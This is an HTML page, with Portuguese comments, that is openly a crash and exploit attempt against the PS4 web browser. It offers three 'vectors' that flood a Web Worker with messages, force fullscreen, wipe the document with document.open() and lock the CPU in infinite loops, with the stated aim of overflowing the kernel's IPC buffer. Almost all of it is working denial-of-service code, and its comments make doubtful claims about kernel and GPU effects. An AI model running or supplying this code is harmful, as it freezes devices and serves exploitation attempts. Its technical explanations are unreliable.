<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v330000: The Iceberg</title>
<style>
    body { background: #000; color: #0ff; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0ff; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #002; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #004; color: #0ff; border: 2px solid #0ff;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0ff; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v330000: THE ICEBERG</h1>

<div class="status">
    ESTRATÉGIA: CONGELAR CPU + INUNDAR IPC (KERNEL BUFFER)<br>
    CLIQUE -> FULLSCREEN -> FECHE ALERTA
</div>

<button onclick="iceberg(i01)">01. White Freeze + IPC Bomb</button>

<button onclick="iceberg(i02)">02. Black Freeze + CSS GPU Desync</button>

<button onclick="iceberg(i03)">03. White Freeze + Zombie Socket</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');

    // =================================================================
    // O AGENTE DO CAOS (WEB WORKER)
    // Este worker vai rodar em paralelo enquanto o navegador estiver travado.
    // Ele vai tentar entupir o canal de comunicação do sistema.
    // =================================================================
    const workerScript = `
        setInterval(() => {
            // Envia mensagens minúsculas mas em alta frequência
            // O objetivo é estourar a tabela de eventos do Kernel, não a RAM.
            postMessage(1);
        }, 0); 
    `;
    const workerBlob = new Blob([workerScript], {type: 'text/javascript'});
    const workerUrl = URL.createObjectURL(workerBlob);

    // =================================================================
    // EXECUTOR ICEBERG
    // =================================================================
    function iceberg(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Inicia o Worker Bombardeiro
        const w = new Worker(workerUrl);
        
        // 2. Configura o Alvo
        const target = vectorFunc(Stage);
        
        // 3. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 4. Timing
        requestAnimationFrame(() => {
            setTimeout(() => {
                window.alert("⚠️ SYSTEM FREEZE ⚠️\n\nAo fechar, o Kernel receberá um flood de IPC.");

                // A. DETONAÇÃO (Visual)
                if(target._detonate) target._detonate();

                // B. TRAVAMENTO (CPU Lock)
                // O Worker (w) continua rodando no fundo, mas 'target._lock()'
                // impede que esta thread processe as mensagens.
                if(target._lock) target._lock();
                
            }, 50);
        });
    }

    // =================================================================
    // 01. White Freeze + IPC Bomb
    // Baseado no seu sucesso "Tela Branca" (Teste 1 v32)
    // =================================================================
    function i01(stage) {
        const d = document.createElement('div');
        d.innerText = "IPC BOMB TARGET";
        stage.appendChild(d);

        // Script Nuke Setup
        const s = document.createElement('script');
        s.src = "data:text/javascript," + "A".repeat(100);
        document.body.appendChild(s);

        d._detonate = () => {
            // Causa a Tela Branca
            s.remove();
            d.remove();
            document.open(); // Nuke
            // Não fecha o document.open
        };

        d._lock = () => {
            // Loop Infinito Leve (CPU pura)
            // Isso impede o navegador de ler as mensagens do Worker
            // O buffer do Kernel vai encher até estourar
            while(true) {
                Math.sin(Math.random());
            }
        };
        return d;
    }

    // =================================================================
    // 02. Black Freeze + GPU Desync
    // Baseado no seu sucesso "Tela Preta" (Teste 2 v32)
    // Adiciona uma animação CSS pesada que roda na GPU
    // =================================================================
    function i02(stage) {
        const d = document.createElement('div');
        d.innerText = "GPU DESYNC TARGET";
        stage.appendChild(d);

        // Adiciona animação CSS infinita (GPU Thread)
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin { to { transform: rotate(360deg); } }
            #gpu-junk { 
                width: 100px; height: 100px; background: red;
                animation: spin 0.1s infinite linear;
                position: fixed; top: 0; left: 0; z-index: 9999;
            }
        `;
        document.head.appendChild(style);
        
        const junk = document.createElement('div');
        junk.id = "gpu-junk";
        document.body.appendChild(junk);

        d._detonate = () => {
            // Causa a Tela Preta
            d.remove();
            // Nuke no body mas mantendo o estilo vivo na memória
            document.body.innerHTML = ""; 
        };

        d._lock = () => {
            // Loop de Layout
            // A GPU tenta animar o elemento #gpu-junk
            // A CPU está travada num loop tentando ler layout
            // Isso cria um descompasso brutal (Deadlock)
            while(true) {
                // Tenta acessar computed style de algo que não existe mais
                window.getComputedStyle(document.body).display;
            }
        };
        return d;
    }

    // =================================================================
    // 03. White Freeze + Zombie Socket
    // Baseado na Tela Branca + Rede Síncrona
    // =================================================================
    function i03(stage) {
        const d = document.createElement('div');
        d.innerText = "SOCKET ZOMBIE";
        stage.appendChild(d);
        
        let xhr = null;

        d._detonate = () => {
            // Abre uma conexão de rede
            xhr = new XMLHttpRequest();
            xhr.open("GET", "/", true);
            xhr.send();
            
            // Causa a Tela Branca (Script Nuke)
            const s = document.createElement('script');
            s.src = "data:text/javascript,A";
            document.body.appendChild(s);
            s.remove();
            document.open();
        };

        d._lock = () => {
            // Trava a CPU com o Socket aberto
            // O Kernel não consegue entregar os pacotes de rede
            // nem fechar a conexão porque o processo está travado
            while(true) {
                history.pushState({}, "", "");
            }
        };
        return d;
    }

</script>
</body>
</html>
